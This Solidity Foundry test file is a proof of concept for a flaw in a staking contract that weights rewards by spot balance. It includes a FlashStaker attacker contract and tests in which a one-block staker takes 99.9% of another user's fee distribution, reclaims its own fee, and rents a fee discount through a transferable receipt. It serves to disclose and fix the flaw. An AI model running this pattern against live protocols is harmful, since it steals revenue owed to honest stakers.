// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.28;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
import {IndexOracle} from "../src/IndexOracle.sol";
import {ETFFactory} from "../src/ETFFactory.sol";
import {ETFShare} from "../src/ETFShare.sol";
import {IssuanceVault} from "../src/IssuanceVault.sol";
import {LeekStaking} from "../src/LeekStaking.sol";
import {ILeekStaking} from "../src/interfaces/ILeekStaking.sol";
import {MockMUSD} from "./mocks/MockMUSD.sol";

/**
 * Proof that entitlement is weighted by balance and not by time.
 *
 * `notifyReward` divides the arriving revenue by `totalSupply()` as it stands
 * in that one call, and nothing imposes a lock, a cooldown or a minimum
 * holding age. So a position held for one instant earns what a position held
 * for a month earns, and both of the attacks below follow from that single
 * fact rather than from any arithmetic slip.
 *
 * These tests assert the CURRENT behaviour, so they pass while the flaw is
 * present. They are written as the demonstration, not as the regression bar -
 * the fix inverts them, and that inversion is the point.
 */
contract FlashStaker {
    LeekStaking immutable staking;
    IssuanceVault immutable vault;
    IERC20 immutable mezo;
    IERC20 immutable musd;

    constructor(LeekStaking staking_, IssuanceVault vault_, IERC20 mezo_, IERC20 musd_) {
        staking = staking_;
        vault = vault_;
        mezo = mezo_;
        musd = musd_;
    }

    /// Stake, trade, unstake - one transaction, no flash loan even needed.
    function tradeAtOwnExpense(uint256 mezoAmount, uint256 musdAmount) external returns (uint256 clawedBack) {
        mezo.approve(address(staking), mezoAmount);
        staking.stake(mezoAmount);

        musd.approve(address(vault), musdAmount);
        uint256 musdBefore = musd.balanceOf(address(this));
        vault.buy(musdAmount, 0);

        staking.unstake(mezoAmount);
        // Whatever MUSD came back beyond the shares bought is the fee the
        // attacker paid returning to them as "revenue".
        clawedBack = musd.balanceOf(address(this)) + musdAmount - musdBefore;
    }

    /// Hold the position only across somebody else's distribution.
    function enter(uint256 mezoAmount) external {
        mezo.approve(address(staking), mezoAmount);
        staking.stake(mezoAmount);
    }

    function exit(uint256 mezoAmount) external returns (uint256 harvested) {
        uint256 before = musd.balanceOf(address(this));
        staking.unstake(mezoAmount);
        harvested = musd.balanceOf(address(this)) - before;
    }
}

contract FlashStakeTest is Test {
    MockMUSD musd;
    MockMUSD mezo;
    IndexOracle oracle;
    ETFFactory factory;
    ETFShare share;
    IssuanceVault vault;
    LeekStaking staking;

    address admin = makeAddr("admin");
    address publisher = makeAddr("publisher");
    address guardian = makeAddr("guardian");
    address treasury = makeAddr("treasury");
    address honest = makeAddr("honestStaker");
    address alice = makeAddr("alice");

    uint256 constant ONE = 1e18;

    function setUp() public {
        vm.warp(1_700_000_000);
        musd = new MockMUSD(18);
        mezo = new MockMUSD(18);
        oracle = new IndexOracle("GOLOGGLE / MUSD", 8, 2000, 1 hours, admin, publisher, guardian);
        vm.prank(publisher);
        oracle.publish(100e8);

        factory = new ETFFactory(IERC20(address(musd)), admin);
        vm.prank(admin);
        factory.registerIndex("GOLOGGLE", oracle, 1 hours, 50, 5000, 1_000_000e18, guardian, treasury);
        (address s, address v) = factory.deployETF("Gologgle Index", "GOLOGGLE");
        share = ETFShare(s);
        vault = IssuanceVault(v);

        staking = new LeekStaking(IERC20(address(mezo)), IERC20(address(musd)), admin);
        vm.prank(admin);
        vault.setStaking(ILeekStaking(address(staking)));

        // An honest staker who has been here all along.
        mezo.mint(honest, 100_000 * ONE);
        vm.startPrank(honest);
        mezo.approve(address(staking), type(uint256).max);
        staking.stake(100_000 * ONE);
        vm.stopPrank();

        musd.mint(alice, 2_000_000e18);
        vm.prank(alice);
        musd.approve(address(vault), type(uint256).max);
    }

    function test_aFlashStakerStealsAlmostAllOfSomebodyElsesDistribution() public {
        FlashStaker attacker = new FlashStaker(staking, vault, IERC20(address(mezo)), IERC20(address(musd)));
        // 1000x the honest stake. No flash loan is modelled because none is
        // needed: any capital that exists for one block is enough.
        mezo.mint(address(attacker), 100_000_000 * ONE);

        // 1. Attacker enters, seeing Alice's buy in the mempool.
        attacker.enter(100_000_000 * ONE);

        // 2. Alice's trade lands and routes its fee to the stakers.
        vm.prank(alice);
        vault.buy(1_000_000e18, 0);

        uint256 routed = staking.totalDistributed();
        assertGt(routed, 0, "no revenue was routed, the test proves nothing");

        // 3. Attacker leaves in the next transaction, taking the revenue.
        uint256 stolen = attacker.exit(100_000_000 * ONE);
        uint256 honestShare = staking.pending(honest);

        emit log_named_decimal_uint("revenue routed by Alice's trade", routed, 18);
        emit log_named_decimal_uint("taken by the one-block staker  ", stolen, 18);
        emit log_named_decimal_uint("left for the long-term staker  ", honestShare, 18);

        // The attacker held 99.9% of supply for one block and took 99.9%.
        assertGt(stolen * 1000, routed * 998, "the flash staker did not capture the distribution");
        assertLt(honestShare * 100, routed, "the honest staker kept more than 1%");
    }

    function test_aFlashStakerGetsTheirOwnFeeBackAndTheTopDiscount() public {
        LeekStaking.Tier[] memory tiers = new LeekStaking.Tier[](1);
        tiers[0] = LeekStaking.Tier(1_000 * ONE, 5_000); // the cap, 50% off
        vm.prank(admin);
        staking.setTiers(tiers);

        FlashStaker attacker = new FlashStaker(staking, vault, IERC20(address(mezo)), IERC20(address(musd)));
        mezo.mint(address(attacker), 100_000_000 * ONE);
        musd.mint(address(attacker), 1_000_000e18);

        // Full fee for a wallet that holds nothing.
        assertEq(vault.effectiveFeeBps(alice), 50);

        uint256 clawedBack = attacker.tradeAtOwnExpense(100_000_000 * ONE, 1_000_000e18);

        // The fee at the discounted rate is 25 bps of 1e24 = 2500e18, half of
        // which routes to stakers; the attacker held almost all the supply, so
        // almost all of that comes back.
        emit log_named_decimal_uint("fee returned to the attacker", clawedBack, 18);
        assertGt(clawedBack, 1_200e18, "the attacker did not recover their own routed fee");
    }

    function test_theDiscountIsReadFromASpotBalanceSoItCanBeRented() public {
        LeekStaking.Tier[] memory tiers = new LeekStaking.Tier[](1);
        tiers[0] = LeekStaking.Tier(1_000 * ONE, 5_000);
        vm.prank(admin);
        staking.setTiers(tiers);

        address renter = makeAddr("renter");
        assertEq(vault.effectiveFeeBps(renter), 50, "a wallet holding nothing should pay full fee");

        // One whale position, lent out. The receipt is transferable, so the
        // same 1000 MEZO can grant the top tier to any number of traders, one
        // per transaction.
        mezo.mint(honest, 1_000 * ONE);
        vm.startPrank(honest);
        staking.stake(1_000 * ONE);
        staking.transfer(renter, 1_000 * ONE);
        vm.stopPrank();

        assertEq(vault.effectiveFeeBps(renter), 25, "the rented position did not grant the discount");
    }
}
